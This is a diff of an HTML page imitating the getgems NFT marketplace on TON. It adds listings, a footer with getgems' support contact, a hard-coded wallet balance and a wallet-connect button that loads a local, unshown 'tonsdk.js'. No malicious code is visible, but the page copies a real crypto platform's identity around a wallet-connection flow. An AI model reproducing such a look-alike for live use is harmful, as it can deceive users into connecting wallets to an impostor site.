@@ -4,10 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>getgems - NFT Marketplace</title>
-    <link rel="stylesheet" href="./css/style.css">
+    <link rel="stylesheet" href="style.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Poppins:wght@500;700&display=swap" rel="stylesheet">
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-    <script src="https://unpkg.com/tonweb@0.0.67/dist/tonweb.js"></script>
 </head>
 <body>
     <header class="site-header">
@@ -17,13 +16,16 @@
                 <span class="logo-text">getgems</span>
             </div>
             <div class="search-bar">
-                <input type="text" placeholder="Search NFTs, collections, or users...">
+                <input type="text" placeholder="Name or description">
             </div>
             <div class="nav-links">
                 <a href="#explore" class="nav-link">Explore</a>
                 <a href="#stats" class="nav-link">Stats</a>
                 <a href="#create" class="nav-link">Create</a>
-                <div id="ton-connect"></div>
+                <div class="wallet-info">
+                    <span class="balance">Ξ 2.74</span>
+                    <div id="ton-connect" class="connect-wallet">Connect Wallet</div>
+                </div>
             </div>
         </nav>
     </header>
@@ -35,12 +37,159 @@
             <a href="#explore" class="cta-button">Explore Now</a>
         </section>
 
+        <section class="featured-section">
+            <div class="featured-card">
+                <img src="https://via.placeholder.com/300" alt="Custom Background" class="featured-image">
+                <div class="featured-content">
+                    <h3>CUSTOM BACKGROUND</h3>
+                    <p>Make your Telegram Username NFTs stand out with custom backgrounds</p>
+                </div>
+            </div>
+            <div class="featured-card">
+                <img src="https://via.placeholder.com/300" alt="NFT Land" class="featured-image">
+                <div class="featured-content">
+                    <h3>NFT LAND</h3>
+                    <p>Check out NFT from the NFT land. Holder collection #ad</p>
+                </div>
+            </div>
+            <div class="featured-card">
+                <img src="https://via.placeholder.com/300" alt="0% Fees for Gifts" class="featured-image">
+                <div class="featured-content">
+                    <h3>0% FEES FOR GIFTS</h3>
+                    <p>Telegram ownership: 100% ownership</p>
+                </div>
+            </div>
+            <div class="featured-card">
+                <img src="https://via.placeholder.com/300" alt="Getgems Wrapped 2024" class="featured-image">
+                <div class="featured-content">
+                    <h3>GETGEMS WRAPPED 2024</h3>
+                    <p>See a recap of the most exciting NFT releases in 2024</p>
+                </div>
+            </div>
+            <div class="featured-card">
+                <img src="https://via.placeholder.com/300" alt="How to Verify Collection?" class="featured-image">
+                <div class="featured-content">
+                    <h3>HOW TO VERIFY COLLECTION?</h3>
+                    <p>Learn how to verify your collection</p>
+                </div>
+            </div>
+        </section>
+
         <section class="nft-gallery">
             <h2 class="gallery-title">Trending NFTs</h2>
             <div id="nft-grid" class="nft-grid"></div>
         </section>
+
+        <section class="top-collections">
+            <h2 class="section-title">Top Collections <span class="filter">1 day</span></h2>
+            <div class="collection-list">
+                <div class="collection-item">
+                    <img src="https://via.placeholder.com/50" alt="Anonymous Telegram Numbers">
+                    <span>Anonymous Telegram Numbers</span>
+                    <span class="price">888.8K TON</span>
+                    <span class="change">+7%</span>
+                </div>
+                <div class="collection-item">
+                    <img src="https://via.placeholder.com/50" alt="Telegram Usernames">
+                    <span>Telegram Usernames</span>
+                    <span class="price">503.8K TON</span>
+                    <span class="change">+7%</span>
+                </div>
+                <!-- Add more collection items as needed -->
+            </div>
+        </section>
+
+        <section class="top-auctions">
+            <h2 class="section-title">Top Auctions</h2>
+            <div class="auction-list">
+                <div class="auction-item">
+                    <img src="https://via.placeholder.com/100" alt="Durov's Caps">
+                    <span>Durov's Caps #3066</span>
+                    <span class="bid">7.875 TON</span>
+                    <span class="time">3 hours</span>
+                </div>
+                <div class="auction-item">
+                    <img src="https://via.placeholder.com/100" alt="Top Hats">
+                    <span>Top Hat #7550</span>
+                    <span class="bid">19.19 TON</span>
+                    <span class="time">6 hours</span>
+                </div>
+                <!-- Add more auction items as needed -->
+            </div>
+            <button class="see-all">See All</button>
+        </section>
+
+        <section class="top-telegram-gifts">
+            <h2 class="section-title">Top Telegram Gifts</h2>
+            <div class="gift-list">
+                <div class="gift-item">
+                    <img src="https://via.placeholder.com/50" alt="Plush Pepes">
+                    <span>Plush Pepes</span>
+                    <span class="price">62.9K TON</span>
+                    <span class="change">-48%</span>
+                </div>
+                <div class="gift-item">
+                    <img src="https://via.placeholder.com/50" alt="Precious Peaches">
+                    <span>Precious Peaches</span>
+                    <span class="price">4.3K TON</span>
+                    <span class="change">-48%</span>
+                </div>
+                <!-- Add more gift items as needed -->
+            </div>
+            <button class="see-all">See All</button>
+        </section>
     </main>
 
-    <script src="./tonsdk.js"></script>
+    <footer class="site-footer">
+        <div class="footer-section">
+            <h3>About TON & NFT</h3>
+            <div class="footer-item">
+                <img src="https://via.placeholder.com/50" alt="What is Getgems?">
+                <p>What is Getgems?</p>
+            </div>
+            <div class="footer-item">
+                <img src="https://via.placeholder.com/50" alt="What is Ton?">
+                <p>What is Ton?</p>
+            </div>
+            <div class="footer-item">
+                <img src="https://via.placeholder.com/50" alt="What is an NFT?">
+                <p>What is an NFT?</p>
+            </div>
+            <div class="footer-item">
+                <img src="https://via.placeholder.com/50" alt="What is a crypto wallet?">
+                <p>What is a crypto wallet?</p>
+            </div>
+            <div class="footer-item">
+                <img src="https://via.placeholder.com/50" alt="How to buy Toncoins?">
+                <p>How to buy Toncoins?</p>
+            </div>
+        </div>
+        <div class="footer-section">
+            <h3>getgems</h3>
+            <p>Welcome to the largest NFT marketplace based on The Open Network. Make yourself at home among other NFT enthusiasts.</p>
+            <div class="social-links">
+                <a href="#">Channel</a>
+                <a href="#">Twitter</a>
+                <a href="#">GitHub</a>
+            </div>
+        </div>
+        <div class="footer-section">
+            <h3>Marketplace</h3>
+            <p>Brand</p>
+            <p>For NFT Creators</p>
+            <p>Terms</p>
+            <p>Privacy Policy</p>
+        </div>
+        <div class="footer-section">
+            <h3>Contacts</h3>
+            <p>Support Bot</p>
+            <p>support@getgems.io</p>
+        </div>
+        <div class="footer-bottom">
+            <p>Based on TON</p>
+        </div>
+    </footer>
+
+    <script src="tonsdk.js"></script>
 </body>
 </html>
